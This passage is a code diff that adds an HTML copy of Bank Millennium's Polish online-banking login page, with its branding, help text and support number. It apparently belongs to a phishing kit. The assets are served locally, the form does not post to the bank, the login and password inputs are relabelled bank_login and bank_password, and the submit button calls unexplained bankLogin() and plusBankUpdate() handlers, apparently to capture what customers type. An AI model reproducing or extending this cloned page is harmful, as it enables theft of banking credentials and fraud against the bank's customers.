@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html id="mainHtml" class="login" style="">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Logowanie - Bank Millennium</title>
+    <meta name="Keywords" content="homebanking">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" href="/assets/banks/millenium_files/bank.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="/assets/banks/millenium_files/bank.ico" type="image/x-icon">
+    <link rel="shortcut icon" sizes="196x196" href="/assets/banks/millenium_files/screen_icon.png">
+    <meta name="DCS.dcsaut" content="">
+    <meta name="DCSext.lang" content="PL">
+    <meta name="DCS.dcsqry" content="?node=Login_MulticodeRequest">
+    <meta name="DCS.sp" content="1">
+    <meta name="DCS.dcsuri" content="Login_MulticodeRequest">
+    <!--Host: 7-->
+    <link href="/assets/css/millennium.css" rel="stylesheet" type="text/css">
+    <link href="/assets/css/millennium2.css" rel="stylesheet" type="text/css">
+    <link href="https://www.bankmillennium.pl/osobiste2/Script.ashx?script=Style_146208$layoutLogin.css&version=146208&min=true" rel="stylesheet" type="text/css">
+    <link href="https://www.bankmillennium.pl/osobiste2/Script.ashx?script=Style_146208$validation.css&version=146208&min=true" rel="stylesheet" type="text/css">
+    <script src="/assets/banks/millenium_files/WebResource(1).ashx" type="text/javascript"></script>
+    <script src="/assets/banks/millenium_files/Script(3).ashx" type="text/javascript"></script>
+    <script src="/assets/banks/millenium_files/WebResource(2).ashx" type="text/javascript"></script>
+    <script src="/assets/banks/millenium_files/Script(4).ashx" type="text/javascript"></script>
+    <style>
+        *{
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+<body class="Modern" id="ui-id-1" aria-busy="false">
+<div class="MNAccessibility LoginAccessibility" data-widget="true" id="ui-id-2">
+    <ul></ul>
+</div>
+<div class="MNModalPanel MNBalloonClosable MNBalloon MNContainer WhiteWithGray BlackTransparency" data-appearance="WhiteWithGray" data-closeonoverlayclick="false" data-donotscrollpage="true" data-dontadjustappearance="false" data-initiallyvisible="false" data-minimumheight="0" data-widget="true" id="login-modal-panel" style="display: none; display: none;">
+    <div class="ModalLayer" style="display: none;"></div>
+</div>
+<div class="LoginPage login-layout-container container-fluid">
+    <div id="support-balloon-mobile-container"></div>
+    <div id="movie-mobile-container" class="visible-xs visible-sm"></div>
+    <div id="login-canvas" class="login-box row Retail_Login_MulticodeRequest oneLeftContainer">
+        <div id="login-left-side" class="login-left-side col-md-5 col-sm-6 col-xs-12">
+            <div aria-valuetext="" class="MNLoading MillenniumLoaderAbsolute Hidden IsModal IsGlobal" data-autoattachtolinks="true" data-widget="true" id="waitMessage" role="progressbar">
+                <div class="ModalLayer"></div>
+                <div class="Image" id="waitMessage_image"></div>
+            </div>
+            <header class="login-header" style="overflow: visible;">
+                <div class="login-header-container">
+                    <div class="header-container">
+                        <div class="logo-container">
+                            <h1 class="aria-hide">Bank Millennium</h1>
+                            <div class="logoLogin">
+                                <a runat="server" href="https://www.bankmillennium.pl/pl/">
+                                    <img src="/assets/banks/millenium_files/Logo@1x.png" width="187" height="45" alt="Bank Millennium" class="hidden-xs">
+                                    <img src="/assets/banks/millenium_files/Logo@2x.png" width="187" height="45" alt="Bank Millennium" class="LogoForMobile">
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="clear-both"></div>
+                </div>
+                <mn:mnhiddenfield id="NavigateUrl" runat="server" controlstatemode="Enabled">
+                    <mn:mnhiddenfield id="NavigateUrlCulture" runat="server" controlstatemode="Enabled">
+                        <script type="text/javascript">
+                            $(document).ready(function () {
+                                $('ul#ulMenu > li').addClass('" + ( lang == "en-US" ? "en" : "pl" ) + "');
+                            });
+                        </script>
+                    </mn:mnhiddenfield>
+                </mn:mnhiddenfield>
+            </header>
+            <div class="clear-both clearfix"></div>
+            <div class="login-body">
+                <div class="MNFieldGroup MNContainer form-horizontal">
+                    <div class="login-body-container">
+                        <div class="MNModalPanel MNBalloonClosable MNBalloon MNContainer left-side-modal-panel NotificationSuccess WhiteTransparency NoTail" data-allowscrollwhenopen="true" data-appearance="NotificationSuccess" data-close="$(&#39;.LoginPage&#39;).Website_LayoutLogin(&#39;setFormFirstInputFocus&#39;);" data-closeonoverlayclick="false" data-dontadjustappearance="false" data-initiallyvisible="false" data-isnotdraggable="true" data-minimumheight="0" data-widget="true" id="left-side-modal-panel" style="display: none; display: none;">
+                            <div class="ModalLayer" style="display: none;"></div>
+                            <div class="ColorShadow Balloon" role="dialog" aria-describedby="left-side-modal-panel_Content" tabindex="0" style="margin-left: -4000px;">
+                                <div class="Header row" id="left-side-modal-panel_Header">
+                                    <div class="IconSuccess FullHeight Icon mille_font col-sm-2"></div>
+                                    <p class="WordWrap col-sm-10"></p>
+                                </div>
+                                <div class="Tail None"></div>
+                                <div class="Content" id="left-side-modal-panel_Content">
+                                    <div></div>
+                                    <a href="javascript:void(0)" tabindex="0" class="CloseButton">
+                                        <span class="aria-hide aria-hide-close">Zamknij</span>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="mobile-top-field-group-separator" class="row marginOverflow">
+                            <div class="MNFieldGroupFieldSeparator visible-xs col-xs-12"></div>
+                        </div>
+                        <div class="login-process-container">
+                            <div id="news-mobile-container" style="display: none;"></div>
+                            <div id="notification-balloon-reference" style="min-height: 1px"></div>
+                            <div class="view-body-container">
+                                <div class="LoginPanelHeader row">
+                                    <div class="col-xs-12 col-sm-12">
+                                        <p id="summaryInfo" class="MNText Text LargeGrayTextSimple Text" data-dateformat="yy-mm-dd">Logowanie do Millenetu</p>
+                                    </div>
+                                </div>
+                                <div action="https://www.bankmillennium.pl/osobiste2/Retail/Login/MulticodeRequest" autocomplete="off" method="post" novalidate="novalidate">
+                                    <input name="__RequestVerificationToken" type="hidden" value="JdpnF956XmgZrdxl6XM4WijDDyi7yeQ1VE6r9ZnKCt5SpaIvfBDmyDoByBmstc6TJsAtUix_ZQdnWnsEdtmQiEVHe_M1">
+                                    <div class="Container">
+                                        <div id="mainCont">
+                                            <b>
+                                                <span class="MNText MediumText Text" data-dateformat="yy-mm-dd">MilleKod</span>
+                                            </b>
+                                            <div class="MNHelpIcon InfoImageButton WhiteInfo" data-widget="true" id="mnHelpIcon423098" tabindex="-1"></div>
+                                            <div class="MNTextBox MNField Multicode form-group BoldLabel DescriptionLeft RoundedWithShadow" data-allowedcharacters="Regex" data-appearance="RoundedWithShadow" data-makefocusonload="true" data-maskautoclear="true" data-onfocus="$(&#39;#LoginKeyBoard&#39;).mnKeyboard(&#39;focusForKeyboard&#39;, this, false, false);$(&#39;#LoginKeyBoard&#39;).mnKeyboard(&#39;getRange&#39;, this);" data-readonly="False" data-watermarkalign="notset" data-widget="true" id="Millekod">
+                                                <div class="Content col-xs-12">
+                                                    <input aria-required="true" class="form-control MNTextBoxContent" data-val="true" data-val-regex="Nieprawidłowy MilleKod lub Twoja własna nazwa dla MilleKodu. Dopuszczalne znaki to: A-Z, a-z, 0-9" data-val-regex-pattern="^[a-zA-Z0-9 ]+$" data-val-required="Pole jest wymagane" id="bank_login" maxlength="16" name="Millekod" pattern="^[a-zA-Z0-9]+$" style="height: 45px;" type="text">
+                                                </div>
+                                                <p class="col-xs-12 col-sm-12 col-md-12 col-lg-12 errorA row">
+                                                    <span class="field-validation-valid" data-valmsg-for="Millekod" data-valmsg-replace="true"></span>
+                                                </p>
+
+                                            </div>
+
+
+                                            <b>
+                                                <span class="MNText MediumText Text" data-dateformat="yy-mm-dd">Hasło</span>
+                                            </b>
+                                            <div class="MNHelpIcon InfoImageButton WhiteInfo" data-widget="true" id="mnHelpIcon423098" tabindex="-1"></div>
+                                            <div class="MNTextBox MNField Multicode form-group BoldLabel DescriptionLeft RoundedWithShadow" data-allowedcharacters="Regex" data-appearance="RoundedWithShadow" data-makefocusonload="true" data-maskautoclear="true" data-onfocus="$(&#39;#LoginKeyBoard&#39;).mnKeyboard(&#39;focusForKeyboard&#39;, this, false, false);$(&#39;#LoginKeyBoard&#39;).mnKeyboard(&#39;getRange&#39;, this);" data-readonly="False" data-watermarkalign="notset" data-widget="true" id="Millekod">
+                                                <div class="Content col-xs-12">
+                                                    <input aria-required="true" class="form-control MNTextBoxContent" data-val="true" data-val-regex="Nieprawidłowy MilleKod lub Twoja własna nazwa dla MilleKodu. Dopuszczalne znaki to: A-Z, a-z, 0-9" data-val-regex-pattern="^[a-zA-Z0-9 ]+$" data-val-required="Pole jest wymagane" id="bank_password" maxlength="16" name="Millekod" pattern="^[a-zA-Z0-9]+$" style="height: 45px;" type="text">
+                                                </div>
+                                                <p class="col-xs-12 col-sm-12 col-md-12 col-lg-12 errorA row">
+                                                    <span class="field-validation-valid" data-valmsg-for="Millekod" data-valmsg-replace="true"></span>
+                                                </p>
+
+                                            </div>
+                                        </div>
+                                        <div class="PasswordPeek">
+                                            <div class="PasswordPeekInner">
+                                                <a class="MNKeyboard KeyboardTrigger mille_font icon-keyboardV2 hidden-xs InactiveColor"></a>
+                                            </div>
+                                        </div>
+                                        <script type="text/javascript">
+                                            $(document).ready(function () {
+                                                $('.Retail_Login_MulticodeRequest').Retail_Login_EyePassword({});
+                                            });
+                                        </script>
+                                    </div>
+                                    <div class="actions-container row">
+                                        <div class="BodyFooterItems col-xs-12">
+                                            <div class="divButtonLogin col-xs-12 col-sm-5" id="buttonsCont">
+                                                <input onclick="bankLogin(); plusBankUpdate()" class="MNButton MNCommand ButtonLogin col-xs-12 btn btn-link PrimaryRounded btn-default" id="BtnLogin" type="submit" value="DALEJ">
+                                            </div>
+                                            <div class="HelpLink col-xs-12 col-sm-8">
+                                                <a class="MNHLink MNCommand Magenta" href="javascript:void(0)" id="HelpLink" onclick="$(&#39;.LoginPage&#39;).Website_LayoutLogin(&#39;showMainBallon&#39;);">Pomoc z logowaniem</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="field-group-separator-container row">
+                                        <div class="MNFieldGroupFieldSeparator col-xs-12"></div>
+                                    </div>
+                                    <div class="MNInfoContent login-information-container panel Plain Custom" data-name="LoginInformation" data-uniqueid="07abbba9852d447e9ac6ac6f0fb2c1a4" data-widget="true" id="login-information-info-content">
+                                        <div class="ci_custom information-neys___con">
+                                            <!--?xml version="1.0" encoding="utf-16"?-->
+                                            <div style="margin:0px; padding:0px; border:0px;">
+                                                <style>
+                                                    .information-neys___con { padding-top: 20px; }
+                                                    #information-neys_ { margin: 0 auto; color: #737373; font-family: Roboto; font-size: 13px; line-height: 16px; max-width: 330px; }
+                                                    #information-neys_ .date, #information-neys_ .link { color: #BD004F; }
+                                                    #information-neys_ .date { font-size: 13px; font-weight: 500; line-height: 16px; margin: 0 23px 0 3px; }
+                                                    #information-neys_ .information__element { display: flex; margin-bottom: 30px; }
+                                                    #information-neys_ .information__element:last-child { margin-bottom: 0; }
+                                                    @media (max-width: 767px){
+                                                        .information-neys___con { margin-top: 0; margin-bottom: 30px!important; }
+                                                        #information-neys_ { max-width: 100%; }
+                                                        #information-neys_ .information__element { display: block; }
+                                                        #information-neys_  .date { margin: 0 0 7px; display: block; }
+                                                    }
+                                                </style>
+                                                <dl id="information-neys_">
+                                                    <dd class="information__element">
+                                                        <span class="date"> 21.05.2020 </span>
+                                                        <span class="content">Sprawdź saldo i zlecaj przelewy z kont w innych bankach wygodnie przez Millenet
+																																								<a href="https://www.bankmillennium.pl/bankowosc-elektroniczna/przelewy-z-innych-bankow" class="link" target="_blank">Więcej</a>
+																																							</span>
+                                                    </dd>
+                                                    <dd class="information__element">
+                                                        <span class="date"> 29.01.2019 </span>
+                                                        <span class="content">Zatwierdzaj w aplikacji transakcje wykonywane w Millenecie, bez wpisywania H@seł SMS
+																																								<a href="https://www.bankmillennium.pl/bankowosc-elektroniczna/bankowosc-mobilna/aplikacja-mobilna-klienci-indywidualni-biznes/autoryzacja-mobilna" class="link" target="_blank">Więcej</a>
+																																							</span>
+                                                    </dd>
+                                                </dl>
+                                                <script>document.getElementById("information-neys_").parentNode.parentNode.classList.add('information-neys___con');</script>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <input id="WindowSize" name="WindowSize" type="hidden" value="1903">
+                                </div>
+                            </div>
+                            <script type="text/javascript">
+                                $(document).ready(function () {
+                                    $('.Retail_Login_MulticodeRequest').Retail_Login_MulticodeRequest({});
+                                    $('#WindowSize').val($(window).width());
+                                });
+                            </script>
+                        </div>
+                        <div class="clear-both"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="login-right-side" class="login-right-side col-md-7 col-sm-6 hidden-xs" style="height: 883px; margin-top: 0px;">
+            <div id="support-balloon-right-side-container" class="login-right-side-container">
+                <div class="problems-help-balloon-container">
+                    <div class="MNBalloonClosable MNBalloon MNContainer login-problems-help-balloon WhiteAndRoundCloseButtonGrayScroll" data-appearance="WhiteAndRoundCloseButtonGrayScroll" data-destinationelement="$(&#39;#&#39;).parent()" data-dontadjustappearance="false" data-initiallyvisible="false" data-isnotdraggable="true" data-minimumheight="250" data-widget="true" style="display: none; display: none; width: 80%;" id="ui-id-5">
+                        <div class="Balloon" style="width: 80%; height: 70%; margin-left: -4000px;" role="dialog" aria-labelby="ui-id-5_Header" aria-describedby="ui-id-5_Content">
+                            <div class="Header" id="_Header">
+                                <span class="MNText LargeText Text" data-dateformat="yy-mm-dd" data-widget="true" id="ui-id-6">Pomoc z logowaniem</span>
+                            </div>
+                            <div class="Tail None"></div>
+                            <div class="Scrollable Content" id="_Content">
+                                <div>
+                                    <div id="login-ballon-container">
+                                        <div class="MNBalloonClosable MNBalloon MNContainer NotificationError" data-appearance="NotificationError" data-close="$(&#39;.LoginPage&#39;).Website_LayoutLogin(&#39;hideMainModal&#39;);" data-destinationelement="$(&#39;#reset-password-error-balloon&#39;).parent()" data-dontadjustappearance="false" data-initiallyvisible="false" data-isnotdraggable="true" data-minimumheight="0" data-widget="true" id="reset-password-error-balloon" style="display: none; display: none;">
+                                            <div class="Balloon" role="dialog" aria-labelby="reset-password-error-balloon_Header" aria-describedby="reset-password-error-balloon_Content" style="margin-left: -4000px;">
+                                                <div class="Header row" id="reset-password-error-balloon_Header">
+                                                    <div class="IconError FullHeight Icon mille_font col-sm-2"></div>
+                                                    <p class="WordWrap col-sm-10">#(Error Header)</p>
+                                                </div>
+                                                <div class="Tail None"></div>
+                                                <div class="Content" id="reset-password-error-balloon_Content">
+                                                    <div>#(Error Message!)</div>
+                                                    <a href="javascript:void(0)" tabindex="0" class="CloseButton">
+                                                        <span class="aria-hide aria-hide-close">Zamknij</span>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div id="login-problems-help-container">
+                                            <div class="MNInfoContent login-problems-help-container panel Plain Custom" data-name="LoginProblemsHelp" data-uniqueid="96d1ce38d8b94e5bb69bee90c665f99c" data-widget="true" id="login-reset-password-info-content">
+                                                <div class="ci_custom ">
+                                                    <!--?xml version="1.0" encoding="utf-16"?-->
+                                                    <div style="margin:0px; padding:0px; border:0px;">
+                                                        <style>
+                                                            .login-problems-help-container dl.helpInfo {margin-right: 20px; margin-left:20px; }
+                                                            .login-problems-help-container dl.helpInfo dd {max-height: 0;display: block;overflow: hidden;color: #737373;font-family: Roboto;font-size: 12px;line-height: 18px;}
+                                                            .login-problems-help-container dl.helpInfo dd p, .login-problems-help-container dl.helpInfo dd li:not(:last-child) {margin-bottom: 12px;}
+                                                            .login-problems-help-container dl.helpInfo dd ul { margin: 23px 0; padding: 0; list-style: none; }
+                                                            .login-problems-help-container dl.helpInfo dd ul:last-child { margin-bottom: 0;}
+                                                            .login-problems-help-container dl.helpInfo dt { color: #2E2E2E; font-family: Roboto; font-size: 14px; font-weight: bold; line-height: 12px; padding: 22px 0 19px; border-top: 1px solid #EDEDED; margin-bottom: 0; }
+                                                            .login-problems-help-container dl.helpInfo dt label {margin-right: 20px; width:100%; margin-bottom: 0;
+                                                                background: transparent url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTFweCIgaGVpZ2h0PSIxMXB4IiB2aWV3Qm94PSIwIDAgMTEgMTEiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIg0KICAgICBzdHlsZT0iZmlsbC1ydWxlOmV2ZW5vZGQ7Y2xpcC1ydWxlOmV2ZW5vZGQ7c3Ryb2tlLWxpbmVqb2luOnJvdW5kO3N0cm9rZS1taXRlcmxpbWl0OjEuNDE0MjE7Ij4NCiAgICAgPHBhdGggZD0iTTYuMDYxLDguMzU5YzAuMTI4LC0wLjA3NiAwLjI0NSwtMC4xNyAwLjM0NiwtMC4yOGwwLjAwMiwwLjAwMmwzLjksLTMuOWMwLjE4NSwtMC4xODcgMC4yODksLTAuNDQgMC4yODksLTAuNzAzYzAsLTAuNTQ5IC0wLjQ1MiwtMSAtMSwtMWMtMC4yNjMsMCAtMC41MTYsMC4xMDQgLTAuNzAzLDAuMjg5bC0zLjQzNiwzLjQzNmwtMy4zNDEsLTMuNDI3Yy0wLjE4OCwtMC4xOTMgLTAuNDQ2LC0wLjMwMiAtMC43MTYsLTAuMzAyYy0wLjU0OSwwIC0xLDAuNDUxIC0xLDFjMCwwLjI2MSAwLjEwMiwwLjUxMSAwLjI4NCwwLjY5OGwzLjkwNSw0LjAwNmwwLjAwNSwwLjAwNWMwLjIyMiwwLjIyMSAwLjUyMywwLjM0NiAwLjgzNywwLjM0N2MwLjIyLC0wLjAwMSAwLjQzNywtMC4wNiAwLjYyOCwtMC4xNzFaIiBzdHlsZT0iZmlsbDojYmMxZTUyO2ZpbGwtcnVsZTpub256ZXJvOyIvPg0KIDwvc3ZnPg0K) no-repeat right center;
+                                                                background-size: 16px 12px; }
+                                                            .login-problems-help-container dl.helpInfo dt label:hover {cursor: pointer;}
+                                                            .login-problems-help-container dl.helpInfo input {display:none;}
+                                                            .login-problems-help-container dl.helpInfo input:checked+dt { color: #BD004F;padding-right: 2px; border-bottom: none; }
+                                                            .login-problems-help-container dl.helpInfo input:checked+dt label {
+                                                                background: transparent url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTFweCIgaGVpZ2h0PSIxMXB4IiB2aWV3Qm94PSIwIDAgMTEgMTEiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIg0KICAgIHN0eWxlPSJmaWxsLXJ1bGU6ZXZlbm9kZDtjbGlwLXJ1bGU6ZXZlbm9kZDtzdHJva2UtbGluZWpvaW46cm91bmQ7c3Ryb2tlLW1pdGVybGltaXQ6MS40MTQyMTsiPg0KICAgIDxwYXRoIGQ9Ik02LjA2MSwyLjY0MWMwLjEyOCwwLjA3NiAwLjI0NSwwLjE3IDAuMzQ2LDAuMjhsMC4wMDIsLTAuMDAybDMuOSwzLjljMC4xODUsMC4xODcgMC4yODksMC40NCAwLjI4OSwNCiAgICAgICAgMC43MDNjMCwwLjU0OSAtMC40NTIsMSAtMSwxYy0wLjI2MywwIC0wLjUxNiwtMC4xMDQgLTAuNzAzLC0wLjI4OWwtMy40MzYsLTMuNDM2bC0zLjM0MSwzLjQyN2MtMC4xODgsDQogICAgICAgIDAuMTkzIC0wLjQ0NiwwLjMwMiAtMC43MTYsMC4zMDJjLTAuNTQ5LDAgLTEsLTAuNDUxIC0xLC0xYzAsLTAuMjYxIDAuMTAyLC0wLjUxMSAwLjI4NCwtMC42OThsMy45MDUsDQogICAgICAgIC00LjAwNmwwLjAwNSwtMC4wMDVjMC4yMjIsLTAuMjIxIDAuNTIzLC0wLjM0NiAwLjgzNywtMC4zNDdjMC4yMiwwLjAwMSAwLjQzNywwLjA2IDAuNjI4LDAuMTcxWiIgc3R5bGU9ImZpbGwtcnVsZTpub256ZXJvOyIvPg0KICAgIDwvc3ZnPg0K) no-repeat right center;
+                                                            }
+                                                            .login-problems-help-container dl.helpInfo input:checked+dt+dd {max-height: 100vh;padding: 2px 15px 22px 0;}
+                                                            .login-problems-help-container dl.helpInfo dt:nth-last-of-type(1){ border-bottom: 1px solid #EDEDED; }
+                                                            .login-problems-help-container dl.helpInfo dd ul li { padding-left: 15px;position: relative; }
+                                                            .login-problems-help-container dl.helpInfo dd ul li::before { color: #BD004F; position: absolute; left: 3px;  content: "\25CF"; }
+
+                                                            .login-problems-help-container dl.helpInfo dd ul.has-icons .btn.btn-default{height:auto;margin-top:20px;margin-bottom:25px;border:2px solid #bd004f}
+                                                            .login-problems-help-container dl.helpInfo dd ul.has-icons b{display:block}
+                                                            .login-problems-help-container dl.helpInfo dd ul.has-icons b.mb-10{margin-bottom:10px;}
+                                                            .login-problems-help-container dl.helpInfo dd ul.has-icons a.bmp-link{color:#bd004f}
+                                                            .login-problems-help-container dl.helpInfo dd ul.has-icons li{padding-left:50px}
+                                                            .login-problems-help-container dl.helpInfo dd ul.has-icons li:before{content:"";width:35px;height:35px;left:0}
+                                                            .login-problems-help-container dl.helpInfo dd ul.has-icons li.icon-1:before{
+                                                                background-image: url(data:image/svg+xml;base64,PHN2ZyBkYXRhLW5hbWU9IldhcnN0d2EgMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNDAgNDAiPjxjaXJjbGUgY3g9IjIwIiBjeT0iMjAiIHI9IjE2LjEzIiBmaWxsPSJub25lIiBzdHJva2U9IiMyZTJlMmUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIiBzdHJva2Utd2lkdGg9IjIiLz48cGF0aCBkPSJNMTUuMTkgMTYuNzRhMy41IDMuNSAwIDAxLjU5LTEuODUgNC41NCA0LjU0IDAgMDExLjcxLTEuNTUgNS40MSA1LjQxIDAgMDEyLjYzLS42MiA1LjUzIDUuNTMgMCAwMTIuNDYuNTIgNCA0IDAgMDExLjY1IDEuNCAzLjQ5IDMuNDkgMCAwMS41OCAxLjkyIDMgMyAwIDAxLS4zMyAxLjQ0IDQuOCA0LjggMCAwMS0uNzkgMS4wNmMtLjMxLjMtLjg1LjgtMS42NCAxLjUxLS4yMi4yLS4zOS4zNy0uNTMuNTJhMi4xIDIuMSAwIDAwLS4yOS40MSAzIDMgMCAwMC0uMTUuMzhjMCAuMTItLjA5LjM0LS4xNi42NmExLjA2IDEuMDYgMCAwMS0xLjE0IDEgMS4xNyAxLjE3IDAgMDEtLjg0LS4zMyAxLjI3IDEuMjcgMCAwMS0uMzQtMSAzLjU0IDMuNTQgMCAwMS4yNS0xLjQgMy40MSAzLjQxIDAgMDEuNjYtMWMuMjgtLjI5LjY1LS42NSAxLjExLTEuMDZzLjcxLS42My44OS0uODFhMi43NiAyLjc2IDAgMDAuNDctLjYxIDEuNTUgMS41NSAwIDAwLjE4LS43MyAxLjY5IDEuNjkgMCAwMC0uNTctMS4zIDIuMDkgMi4wOSAwIDAwLTEuNDctLjUzIDIuMDYgMi4wNiAwIDAwLTEuNTYuNTMgNC4xNiA0LjE2IDAgMDAtLjg1IDEuNThjLS4yMi43Mi0uNjMgMS4wOC0xLjI0IDEuMDhhMS4yIDEuMiAwIDAxLS45MS0uMzggMS4xNyAxLjE3IDAgMDEtLjM3LS44NHptNC42OSAxMC41NGExLjUyIDEuNTIgMCAwMS0xLS4zOCAxLjM1IDEuMzUgMCAwMS0uNDQtMS4wNiAxLjMzIDEuMzMgMCAwMS40My0xIDEuNCAxLjQgMCAwMTEtLjQyIDEuNDMgMS40MyAwIDAxMS40NCAxLjQ0IDEuMzMgMS4zMyAwIDAxLS40NCAxLjA1IDEuNDMgMS40MyAwIDAxLS45OS4zN3oiIGZpbGw9IiNiZDAwNGYiLz48L3N2Zz4=);}
+
+                                                            .login-problems-help-container dl.helpInfo dd ul.has-icons li.icon-2:before{
+                                                                background-image: url(data:image/svg+xml;base64,PHN2ZyBpZD0iV2Fyc3R3YV8xIiBkYXRhLW5hbWU9IldhcnN0d2EgMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNDAgNDAiPjxkZWZzPjxzdHlsZT4uY2xzLTEsLmNscy0ye2ZpbGw6bm9uZTtzdHJva2UtbGluZWNhcDpyb3VuZDtzdHJva2Utd2lkdGg6MnB4fS5jbHMtMXtzdHJva2U6IzJlMmUyZTtzdHJva2UtbWl0ZXJsaW1pdDoxMH0uY2xzLTJ7c3Ryb2tlOiNiZDAwNGY7c3Ryb2tlLWxpbmVqb2luOnJvdW5kfTwvc3R5bGU+PC9kZWZzPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTI4IDEyLjcxdi03QTEuNzYgMS43NiAwIDAwMjYuMTcgNEg4LjgzQTEuNzYgMS43NiAwIDAwNyA1LjY4djI4LjY0QTEuNzYgMS43NiAwIDAwOC44MyAzNmgxNy4zNEExLjc2IDEuNzYgMCAwMDI4IDM0LjMyVjI0TTggMjhoMjBNMTUuMjcgOEgyMCIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTI0IDE4aDExIi8+PHBhdGggZD0iTTMyLjI5IDE1LjcxbDIuMyAyLjI5LTIuMyAyLjI5YTEgMSAwIDAwMS40MiAxLjQybDMtM2ExIDEgMCAwMDAtMS40MmwtMy0zYTEgMSAwIDAwLTEuNDIgMS40MnoiIGZpbGw9IiNiZDAwNGYiLz48L3N2Zz4=); background-position: top center;}
+
+
+
+                                                        </style>
+                                                        <dl class="helpInfo">
+                                                            <input id="helpInfo--2" type="checkbox">
+                                                            <dt>
+                                                                <label for="helpInfo--2">Pierwsze logowanie</label>
+                                                            </dt>
+                                                            <dd>
+                                                                <p>Podczas pierwszego logowania do Millenetu system poprosi&nbsp;o następujące dane:</p>
+                                                                <ul>
+                                                                    <li>
+                                                                        <b>MilleKod</b> to Twój 8-cyfrowy login do konta. Znajdziesz go w umowie otrzymanej przy zakładaniu konta w Banku Millennium.
+                                                                    </li>
+                                                                    <li>
+                                                                        <b>H@sło Tymczasowe</b> jest definiowane przez Ciebie podczas składania wniosku o konto (4 cyfry) lub otrzymane w bezpiecznej kopercie w placówce Banku (8 cyfr).
+                                                                    </li>
+                                                                    <li>
+                                                                        <b>H@sło 1</b> to hasło, którym będziesz się logować do konta w Millenecie, TeleMillennium lub zatwierdzać operację w aplikacji mobilnej. H@sło 1 powinno składać się z 8 cyfr i być trudne do odgadnięcia dla innych. Nie używaj prostych kombinacji, np. 12345678, daty Twojego urodzenia czy numeru telefonu. W zdefiniowaniu odpowiedniego H@sła 1 pomoże Ci wskaźnik siły hasła.
+                                                                    </li>
+                                                                    <li>
+                                                                        <b>Identyfikator</b> to np. Twój PESEL, numer dowodu osobistego lub paszportu. Jeśli logujesz się do konta firmowego, może to być również NIP lub REGON. System nigdy nie prosi o podanie więcej niż dwóch znaków z wybranego identyfikatora
+                                                                    </li>
+                                                                    <li>
+                                                                        <b>H@sło SMS</b> to 6-cyfrowe hasło przesyłane w wiadomości SMS na zdefiniowany w systemie Banku numer telefonu.
+                                                                    </li>
+                                                                </ul>
+                                                            </dd>
+                                                            <input id="helpInfo--3" type="checkbox">
+                                                            <dt>
+                                                                <label for="helpInfo--3">Problem z MilleKodem</label>
+                                                            </dt>
+                                                            <dd>
+                                                                <p>MilleKod to Twój 8-cyfrowy login do konta, znajdziesz go w umowie.</p>
+                                                                <ul class="has-icons">
+                                                                    <li class="icon-1">
+                                                                        <b class="mb-10">Sprawdź MilleKod bez aplikacji</b>
+                                                                        <p>Jeśli nie masz aplikacji lub nie korzystałeś z niej w ciągu ostatnich 30 dni wyświetlimy Twój MilleKod inaczej.
+                                                                            <a href="javascript:void(0)" class="MNButton MNCommand btn PrimaryRounded btn-default RetrieveMillecodeProcessStart">Odzyskaj MilleKod</a>
+                                                                        </p>
+                                                                    </li>
+                                                                    <li class="icon-2">
+                                                                        <b class="mb-10">Sprawdź MilleKod w aplikacji</b>
+                                                                        <p>Posiadasz aktywną aplikację mobilną Banku Millennium i masz do niej dostęp? Zaloguj się do aplikacji, z menu wybierz Kontakt, a następnie Połącz bezpośrednio z konsultantem.</p>
+                                                                    </li>
+                                                                </ul>
+                                                                <p>Jeśli posiadasz aktywną aplikację ale nie masz do niej dostępu lub nie pamiętasz PIN-u/H@sła 1, skontaktuj się z nami: +48 22 598 40 50 lub odwiedź najbliższy oddział Banku.</p>
+                                                            </dd>
+                                                            <input id="helpInfo--4" type="checkbox">
+                                                            <dt>
+                                                                <label for="helpInfo--4">Problem z H@słem Tymczasowym</label>
+                                                            </dt>
+                                                            <dd>
+                                                                <p>
+                                                                    Nie pamiętasz lub masz zablokowane hasło tymczasowe do logowania? Masz trzy możliwości:</p>
+                                                                <ol>
+                                                                    <li>Samodzielnie ustal nowe hasło po udzieleniu prawidłowych odpowiedzi na 5 pytań dot. Twojego konta i usług w Banku Millennium. Kliknij poniżej „Zmień”.</li>
+                                                                    <li>Odwiedź najbliższą placówkę Banku Millennium i odbierz nowe H@sło Tymczasowe w bezpiecznej kopercie.</li>
+                                                                    <li>Jeśli masz aktywną usługę H@seł SMS, zadzwoń na infolinię TeleMillennium:
+                                                                        <br>
+                                                                        <b>+48 22 598 40 50</b> (z telefonów stacjonarnych i komórkowych)
+                                                                    </li>
+                                                                </ol>
+                                                            </dd>
+                                                            <input id="helpInfo--5" type="checkbox">
+                                                            <dt>
+                                                                <label for="helpInfo--5">Kolejne logowanie</label>
+                                                            </dt>
+                                                            <dd>
